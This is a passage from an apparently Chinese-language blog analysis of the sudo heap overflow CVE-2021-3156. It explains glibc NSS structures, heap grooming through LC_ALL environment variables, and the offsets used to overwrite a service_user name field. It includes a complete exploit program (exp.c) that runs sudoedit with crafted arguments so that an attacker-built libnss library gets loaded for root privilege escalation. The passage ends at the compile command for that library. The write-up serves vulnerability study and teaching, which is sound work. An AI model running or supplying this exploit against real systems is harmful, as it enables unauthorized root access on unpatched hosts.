<h3 id="NSS（Name-Service-Switch）"><a href="#NSS（Name-Service-Switch）" class="headerlink" title="NSS（Name Service Switch）"></a>NSS（Name Service Switch）</h3><p>目前公开的 exp 大都利用了 NSS（Name Service Switch）机制，这里简述 NSS 的机制</p>
<p>首先是根据 <code>/etc/nsswitch.conf</code> 内容（例如下面这个），初始化链式的 name_database_entry 结构体</p>
<pre class="line-numbers language-none"><code class="language-none"># &#x2F;etc&#x2F;nsswitch.conf
#
# Example configuration of GNU Name Service Switch functionality.
# If you have the &#96;glibc-doc-reference&#39; and &#96;info&#39; packages installed, try:
# &#96;info libc &quot;Name Service Switch&quot;&#39; for information about this file.

passwd:         files systemd
group:          files systemd
shadow:         files
gshadow:        files

hosts:          files dns
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>name_database_entry 结构体定义如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name_database_entry</span>
<span class="token punctuation">&#123;</span>
  <span class="token comment">/* And the link to the next entry.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">name_database_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
  <span class="token comment">/* List of service to be used.  */</span>
  service_user <span class="token operator">*</span>service<span class="token punctuation">;</span>
  <span class="token comment">/* Name of the database.  */</span>
  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> name_database_entry<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>name</code> 字段就是 <code>group</code>，<code>shadow</code> 这些字符串，然后以 <code>next</code> 字段链接起来形成链表</p>
<p>后面的 <code>files systemd</code> 是 service_user 结构体的 <code>name</code> 字段，定义如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">service_user</span>
<span class="token punctuation">&#123;</span>
  <span class="token comment">/* And the link to the next entry.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">service_user</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
  <span class="token comment">/* Action according to result.  */</span>
  lookup_actions actions<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">/* Link to the underlying library object.  */</span>
  service_library <span class="token operator">*</span>library<span class="token punctuation">;</span>
  <span class="token comment">/* Collection of known functions.  */</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>known<span class="token punctuation">;</span>
  <span class="token comment">/* Name of the service (`files', `dns', `nis', ...).  */</span>
  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> service_user<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要使用服务的时候，如果库未加载，则会调用 <code>nss_load_library</code> 函数加载动态链接库</p>
<p>在 set_cmnd 函数结束后，sudoers_lookup 会调用 <code>nss_load_library</code> 函数，源码如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//glibc/nss/nsswitch.c</span>
<span class="token keyword">static</span> <span class="token keyword">int</span>
<span class="token function">nss_load_library</span> <span class="token punctuation">(</span>service_user <span class="token operator">*</span>ni<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token comment">/* This service has not yet been used.  Fetch the service
         library for it, creating a new one if need be.  If there
         is no service table from the file, this static variable
         holds the head of the service_library list made from the
         default configuration.  */</span>
      <span class="token keyword">static</span> name_database default_table<span class="token punctuation">;</span>
      ni<span class="token operator">-></span>library <span class="token operator">=</span> <span class="token function">nss_new_service</span> <span class="token punctuation">(</span>service_table <span class="token operator">?</span><span class="token operator">:</span> <span class="token operator">&amp;</span>default_table<span class="token punctuation">,</span>
                                     ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token comment">/* Load the shared library.  */</span>
      <span class="token class-name">size_t</span> shlen <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span>
                      <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>__nss_shlib_revision<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">int</span> saved_errno <span class="token operator">=</span> errno<span class="token punctuation">;</span>
      <span class="token keyword">char</span> shlib_name<span class="token punctuation">[</span>shlen<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token comment">/* Construct shared object name.  */</span>
      <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">,</span>
                                              <span class="token string">"libnss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                    ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>
                          <span class="token string">".so"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                __nss_shlib_revision<span class="token punctuation">)</span><span class="token punctuation">;</span>
      ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">=</span> <span class="token function">__libc_dlopen</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token comment">/* Failed to load the library.  */</span>
          ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1l</span><span class="token punctuation">;</span>
          <span class="token function">__set_errno</span> <span class="token punctuation">(</span>saved_errno<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ifdef</span> <span class="token expression">USE_NSCD</span></span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>is_nscd<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token comment">/* Call the init function when nscd is used.  */</span>
          <span class="token class-name">size_t</span> initlen <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>name<span class="token punctuation">)</span>
                            <span class="token operator">+</span> <span class="token function">strlen</span> <span class="token punctuation">(</span><span class="token string">"_init"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">char</span> init_name<span class="token punctuation">[</span>initlen<span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token comment">/* Construct the init function name.  */</span>
          <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>init_name<span class="token punctuation">,</span>
                                        <span class="token string">"_nss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                              ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token string">"_init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">/* Find the optional init function.  */</span>
          <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>ifct<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">traced_file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token operator">=</span> <span class="token function">__libc_dlsym</span> <span class="token punctuation">(</span>ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle<span class="token punctuation">,</span> init_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>ifct <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>cb<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">traced_file</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> nscd_init_cb<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">ifdef</span> <span class="token expression">PTR_DEMANGLE</span></span>
              <span class="token function">PTR_DEMANGLE</span> <span class="token punctuation">(</span>cb<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">endif</span></span>
              <span class="token function">ifct</span> <span class="token punctuation">(</span>cb<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">endif</span></span>
    <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最主要的是，当 <code>ni-&gt;library-&gt;lib_handle == NULL</code> 成立后，会执行 <code>dlopen</code> 加载动态链接库：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
      <span class="token keyword">char</span> shlib_name<span class="token punctuation">[</span>shlen<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token comment">/* Construct shared object name.  */</span>
      <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">,</span>
                                              <span class="token string">"libnss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                    ni<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>
                          <span class="token string">".so"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                __nss_shlib_revision<span class="token punctuation">)</span><span class="token punctuation">;</span>
      ni<span class="token operator">-></span>library<span class="token operator">-></span>lib_handle <span class="token operator">=</span> <span class="token function">__libc_dlopen</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
   
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前面有 <code>ni-&gt;library == NULL</code> 时执行 <code>nss_new_service</code> 返回的 <code>library-&gt;lib_handle</code> 就是 NULL</p>
<p>且 service_user 结构体刚好在堆上，只要溢出覆盖一个 service_user 结构体，伪造 <code>name</code> 字段为 <code>X/X</code>，<code>library</code> 字段为 NULL，那么后续调用 <code>nss_load_library</code> 时就会调用 <code>__libc_dlopen(&quot;libnss_X/X.so.xx&quot;)</code> 加载自己写的动态链接库 </p>
<p>只要动态链接库写个 constructor 函数，执行 shell，即可提权</p>
<p>这里有一点，大部分文章都没提到（也可能是默认大家都知道了）：<strong>为什么一定要覆盖 <code>name</code> 成 <code>X/X</code> 的形式，而不是 <code>X</code> 的形式？</strong></p>
<p>这可以从 dlopen 的 man 手册中找到答案：</p>
<pre class="line-numbers language-none"><code class="language-none">......
       If filename is NULL, then the returned handle is for the main program.  If filename contains a slash (&quot;&#x2F;&quot;), then it is
       interpreted as a (relative or absolute) pathname.  Otherwise, the dynamic linker searches for the  object  as  follows
       (see ld.so(8) for further details):

......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概意思是，filename 参数只有存在 <code>/</code> 的时候，才会有可能被当作相对路径，没有 <code>/</code> 的时候，会去 PATH 等环境变量指向的地方找对应的库文件，为了方便，使用相对路径的方式，所以使用 <code>X/X</code> 的形式</p>
<h3 id="service-user-结构体分布"><a href="#service-user-结构体分布" class="headerlink" title="service_user 结构体分布"></a>service_user 结构体分布</h3><p>gdb 上使用 <code>search -s systemd</code> 可以找到 service_user 等结构体</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-7.png" alt="service_user"></p>
<p>可以看到 passwd 的 name_database_entry，的 <code>service</code> 字段指向了一条链表，链表上是 <code>files</code> -&gt; <code>systemd</code> 的 service_user 结构体</p>
<p>那么只要覆盖这两个 service_user 中的一个就可以了，覆盖后面的 service_user 可能会同时把前面的 service_user 也覆盖了，破坏了链表就不行了，所以选择覆盖前面的那个 service_user，同时不能把前面的 name_database_entry 结构体也破坏了</p>
<p>实际情况下，在漏洞点之前会先后从堆上分配下面这些结构体：</p>
<pre class="line-numbers language-none"><code class="language-none">passwd(name_database_entry)
files(service_user)
systemd(service_user)
group(name_database_entry)
files(service_user)
systemd(service_user)
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只要 user_args 位于 name_database_entry 和 service_user 之间，即可覆盖 service_user 而不会破坏 name_database_entry 了</p>
<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><p>通过调试发现，在我的复现环境下，一般情况下 user_args 都位于 service_user 之后，根据目前公开的方式，利用程序开头的 setlocale 函数，对 <code>LC_MESSAGES</code>，<code>LC_ALL</code> 等环境变量，都会有多次的堆块分配与释放，影响堆块布局的情况，使得 user_args 分配时，得到的刚好是 setlocale 中 free 进 tcache 的 chunk，因为 setlocale 函数的调用在 service_user 等结构体分配之前，那么 user_args 就能分布在 service_user 结构体之前</p>
<p>比如，环境变量使用 <code>LC_ALL=C.UTF-8@AAAA</code>，<code>@</code> 字符后面的 <code>AAAA</code> 将会在 setlocale 里分配 chunk 进行存储，之后会释放</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>经过多次测试，exp 如下，下面使用这个 exp 进行一下调试，说明为什么要这么写：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//exp.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_ENVP</span> <span class="token expression"><span class="token number">0x1000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LC_ENV1</span> <span class="token string">"LC_ALL=C.UTF-8@"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LC_ENV2</span> <span class="token string">"LC_CTYPE=C.UTF-8@"</span></span>

<span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span>MAX_ENVP<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">char</span> paddingA<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span>paddingA<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        paddingA<span class="token punctuation">[</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span> <span class="token operator">*</span>s_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"sudoedit"</span><span class="token punctuation">,</span> <span class="token string">"-s"</span><span class="token punctuation">,</span> paddingA<span class="token punctuation">,</span> <span class="token constant">NULL</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token keyword">int</span> envp_pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xb10</span><span class="token operator">-</span><span class="token number">0x190</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x30</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"x/i4oyu"</span><span class="token punctuation">;</span> <span class="token comment">//name</span>
        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"AAA"</span><span class="token punctuation">;</span>

        <span class="token keyword">char</span> <span class="token operator">*</span>LC1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">strcpy</span><span class="token punctuation">(</span>LC1<span class="token punctuation">,</span> LC_ENV1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span>LC1 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LC_ENV1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        char *LC2 = calloc(0x1000, 1);
        strcpy(LC2, LC_ENV2);
        memset(LC2 + sizeof(LC_ENV2) - 1, 'Y', 0x90);
        */</span>

        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> LC1<span class="token punctuation">;</span>
        <span class="token comment">//envp[envp_pos++] = LC2;</span>
        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                                                                    
        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/path/to/sudoedit"</span><span class="token punctuation">,</span> s_argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//execve("/usr/bin/sudoedit", s_argv, envp);</span>

        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先看到这里</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token keyword">char</span> <span class="token operator">*</span>LC1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">strcpy</span><span class="token punctuation">(</span>LC1<span class="token punctuation">,</span> LC_ENV1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span>LC1 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LC_ENV1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试来到 user_args 分配前，查看 heap 情况，存储 0xc0 个 <code>X</code> 的 chunk 在这里：</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-8.png" alt="heap"></p>
<p>同时也可以看到，这个 chunk 的大小并不是 0xc0，而是比 0xc0 要大得多的 0x1a0，和参考的一些文章的说法不太一样</p>
<p>同时可以看到这个 0x1a0 的 chunk 位于 name_database_entry 和 service_user 之间：</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-9.png" alt="user_args_chunk"></p>
<p><strong>注意</strong>：实际上 <code>set_cmnd</code> 调用后，会从 group 的 name_database_entry 开始查找 service_user 结构体进行 <code>nss_load_library</code> 的调用，所以图中使用的是 group 的链</p>
<p>exp 这里的 0x190-2 就是为了控制命令行参数的长度，使得 user_args 的分配调用 <code>malloc(0x190)</code> 从而分配到上面提到的 chunk：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token keyword">char</span> paddingA<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span>paddingA<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        paddingA<span class="token punctuation">[</span><span class="token number">0x190</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\\'</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>溢出点到要覆盖 service_user 的偏移为 +0xb10：</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-10.png" alt="len"></p>
<p>命令行参数本身有 0x190-1 长的数据复制进了 to，那么只需要连续 <code>0xb10 - 0x190 + 1</code> 多的反斜杠即可连续写入 <code>\0</code>，直到目标 service_user 结构体，再继续覆写 0x30 长度的数据，即可到达 <code>name</code> 字段，这就是对下面这部分代码的解释：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token keyword">int</span> envp_pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xb10</span><span class="token operator">-</span><span class="token number">0x190</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x30</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"x/i4oyu"</span><span class="token punctuation">;</span> <span class="token comment">//name</span>
        envp<span class="token punctuation">[</span>envp_pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"AAA"</span><span class="token punctuation">;</span>
   
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>这里覆盖 <code>name</code> 为 <code>x/xi4oyu</code>，那么需要编译一个动态链接库 <code>libnss_x/xi4oyu.so.2</code> ，代码如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//mkdir libnss_x &amp;&amp; gcc -fPIC -shared -o 'libnss_x/i4oyu.so.2' xi4oyu.c</span>
